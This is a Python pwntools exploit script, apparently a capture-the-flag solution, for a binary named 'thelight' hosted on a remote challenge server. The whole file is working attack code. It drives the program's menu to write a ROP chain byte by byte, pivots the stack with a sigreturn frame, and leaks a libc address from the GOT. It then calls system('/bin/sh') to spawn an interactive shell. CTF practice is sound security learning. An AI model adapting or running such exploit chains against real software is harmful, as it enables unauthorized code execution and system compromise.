#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './thelight')


if args.LOCAL_LIBC:
    libc = exe.libc
else:
    library_path = libcdb.download_libraries('./libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('./libc.so.6')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *listPanels+400
b *0x40141F
continue
'''.format(**locals())

# -- Exploit goes here --

# io = start()
io = remote('0.cloud.chals.io', 24481)

for _ in range(4):
    io.sendlineafter(b'>  ', b'y')

for _ in range(10 + (8*6) + 4 + 2):
    io.sendlineafter(b'>  ', b'5')

io.sendlineafter(b'>  ', b'1')
io.sendlineafter(b'>  ', b'5') # char=1

for _ in range(0xff):
    io.sendlineafter(b'>  ', b'1')

for _ in range(3 + 8 + 4):
    io.sendlineafter(b'>  ', b'5')

last = 0

def do_rop(ropchain):
    global last
    print('writing topchain')
    for x in ropchain:
        for _ in range((x - last)&0xff):
            io.sendlineafter(b'>  ', b'1')
        last = x
        io.sendlineafter(b'>  ', b'5')

rop = ROP(exe)
rop.puts(exe.got.atoi)
rop.raw(0x40141F)

s = SigreturnFrame()
s.rip = 0x401436
s.rax = 0
s.rdi = 0
s.rsi = 0x40407C+4+0x900
s.rdx = 0x100
s.rsp = 0x40407C+4+0x900
rop.raw(bytes(s))

# print(rop.dump())

do_rop(rop.chain())

io.sendlineafter(b'>  ', b'7')

leak = io.recvuntil(b'\x7f')
libc_leak = u64(leak[-6:].ljust(8, b'\x00'))
libc.address = libc_leak - libc.sym.atoi
log.success(f"{libc.address = :#x}")

input('Continue ?')

rop = ROP(libc)
rop.raw(rop.ret.address)
rop.raw(rop.ret.address)
rop.system(next(libc.search(b'/bin/sh')))

io.sendline(rop.chain())

io.interactive()

